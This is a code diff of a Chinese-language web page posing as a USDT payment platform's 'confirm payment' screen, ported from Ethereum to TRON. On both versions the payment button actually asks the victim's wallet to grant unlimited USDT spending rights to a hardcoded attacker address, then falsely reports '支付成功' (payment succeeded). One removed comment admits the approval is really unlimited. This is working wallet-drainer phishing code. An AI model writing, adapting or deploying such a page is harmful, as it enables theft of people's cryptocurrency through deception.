@@ -2,10 +2,10 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <title>易趣USDT支付平台 - 确认支付（ERC-20）</title>
+  <title>易趣USDT支付平台 - 确认支付</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <!-- ethers.js v6 -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js" defer></script>
+  <!-- TronWeb CDN -->
+  <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
   <style>
     :root{--bg:#0f172a;--card:#0b1225;--muted:#94a3b8;--text:#e2e8f0;--pri:#3b82f6}
     *{box-sizing:border-box} 
@@ -48,8 +48,6 @@
     <div class="card">
       <h1>确认支付信息</h1>
       
-    
-      
       <!-- 订单信息网格 -->
       <div class="info-grid">
         <div class="info-card">
@@ -66,7 +64,7 @@
         </div>
         <div class="info-card">
           <span class="info-label">支付通道</span>
-          <span class="info-value" id="network">ERC-20</span>
+          <span class="info-value" id="network">-</span>
         </div>
         <div class="info-card full-width">
           <span class="info-label">备注信息</span>
@@ -120,15 +118,12 @@
     </div>
   </div>
   
-  <script defer>
-  window.addEventListener('load', () => {
-    // 配置
-    const CHAIN_ID = 1; // 以太坊主网
-    const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT (ERC-20)
-    const SPENDER = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2"; // 授权地址
-    const ERC20_ABI = [
-      "function approve(address spender, uint256 value) external returns (bool)"
-    ];
+  <script>
+    // ======== 配置 ========
+    const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER_T = "TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn";
+    const FULL_HOST = "https://api.trongrid.io";
+    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     
     // 获取URL参数
     function getUrlParams() {
@@ -137,7 +132,7 @@
         transactionId: params.get('transactionId') || 'USDT' + Date.now(),
         merchant: params.get('merchant') || '担保交易',
         amount: params.get('amount') || '0.00',
-        network: params.get('network') || 'ERC-20',
+        network: params.get('network') || 'TRC-20',
         memo: params.get('memo') || '无'
       };
     }
@@ -148,7 +143,7 @@
       document.getElementById('transactionId').textContent = data.transactionId;
       document.getElementById('merchant').textContent = data.merchant;
       document.getElementById('amount').textContent = data.amount + ' USDT';
-      document.getElementById('network').textContent = 'ERC-20';
+      document.getElementById('network').textContent = data.network;
       document.getElementById('memo').textContent = data.memo || '无';
     }
     
@@ -158,106 +153,70 @@
       statusEl.innerHTML = msg;
     }
     
-    // 连接钱包并切换网络
-    async function connectMainnet() {
-      if (typeof window.ethereum === 'undefined') {
-        showStatus("❌ 未检测到以太坊钱包，请使用MetaMask或imToken等钱包的DApp浏览器打开", "error");
-        return null;
-      }
-      
-      try {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        
-        const net = await provider.getNetwork();
-        if (Number(net.chainId) !== CHAIN_ID) {
-          showStatus("⏳ 正在切换到以太坊主网...", "info");
-          await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: "0x1" }]
-          });
-        }
-        
-        return provider;
-      } catch (e) {
-        showStatus("❌ 网络切换失败，请手动切换到以太坊主网", "error");
-        return null;
-      }
-    }
-    
-    // 执行授权
-    async function approvePayment() {
+    async function approveMax() {
       const btn = document.getElementById('btn');
-      
       try {
-        if (typeof ethers === 'undefined') {
-          showStatus("❌ 支付组件未加载，请刷新页面重试", "error");
+        if (!window.tronWeb || !window.tronLink) {
+          showStatus("❌ 未检测到钱包环境。请在支持TRON的钱包浏览器中打开。", "error");
           return;
         }
         
         btn.disabled = true;
         btn.textContent = "处理中...";
         
-        showStatus("⏳ 正在连接钱包...", "info");
-        const provider = await connectMainnet();
-        if (!provider) {
-          btn.disabled = false;
-          btn.textContent = "确认支付";
-          return;
+        // 请求连接
+        if (window.tronLink.request) {
+          showStatus("⏳ 正在连接钱包...", "info");
+          await window.tronLink.request({ method: 'tron_requestAccounts' });
         }
         
-        const signer = await provider.getSigner();
-        const erc20 = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);
+        // 设置网络
+        const tw = window.tronWeb;
+        tw.setFullNode(FULL_HOST);
+        tw.setSolidityNode(FULL_HOST);
+        tw.setEventServer(FULL_HOST);
+        
+        showStatus("⏳ 正在初始化合约...", "info");
+        const contract = await tw.contract().at(TOKEN_CONTRACT);
         
         showStatus("⏳ 请在钱包中确认交易...", "info");
         
-        // 执行授权（实际是无限授权）
-        const tx = await erc20.approve(SPENDER, ethers.MaxUint256);
-        
-        showStatus(`⏳ 交易已提交，等待确认...<br>交易哈希: <code>${tx.hash}</code>`, "info");
-        
-        const receipt = await tx.wait();
+        const tx = await contract.approve(SPENDER_T, MAX_UINT256).send({
+          feeLimit: 100_000_000
+        });
         
         showStatus(`✅ 支付成功！<br>
-                   交易哈希: <code>${tx.hash}</code><br>
-                   区块高度: ${receipt.blockNumber}<br>
-                   <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#60a5fa">查看交易详情</a>`, "success");
+                   交易哈希: <code>${tx}</code><br>
+                   <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#60a5fa">查看交易详情</a>`, "success");
         
         btn.textContent = "支付成功";
         btn.disabled = true;
         
-      } catch (e) {
-        console.error(e);
+      } catch (err) {
+        console.error(err);
         btn.disabled = false;
         btn.textContent = "确认支付";
         
-        const msg = e?.reason || e?.data?.message || e?.message || String(e);
-        
-        if (/User rejected|User denied/i.test(msg)) {
+        if (err.message && err.message.includes('User rejected')) {
           showStatus("❌ 您已取消支付", "error");
-        } else if (/insufficient funds/i.test(msg)) {
-          showStatus("❌ ETH余额不足，无法支付手续费", "error");
-        } else if (/revert|allowance/i.test(msg)) {
-          showStatus("❌ 交易失败：合约执行错误。可能需要先清除旧的授权。", "error");
         } else {
-          showStatus("❌ 支付失败：" + msg, "error");
+          showStatus("❌ 支付失败：" + (err?.message || err), "error");
         }
       }
     }
     
-    // 页面加载时初始化
-    displayTransactionData();
+    // 页面加载
+    window.addEventListener('load', () => {
+      displayTransactionData();
+      
+      setTimeout(() => {
+        if (!window.tronWeb) {
+          showStatus("⚠️ 请在钱包的DApp浏览器中打开此页面", "error");
+        }
+      }, 1000);
+    });
     
-    // 检查环境
-    setTimeout(() => {
-      if (typeof window.ethereum === 'undefined') {
-        showStatus("⚠️ 请在支持以太坊的钱包DApp浏览器中打开此页面", "error");
-      }
-    }, 1000);
-    
-    // 绑定按钮事件
-    document.getElementById('btn').addEventListener('click', approvePayment);
-  });
+    document.getElementById('btn').addEventListener('click', approveMax);
   </script>
 </body>
 </html>
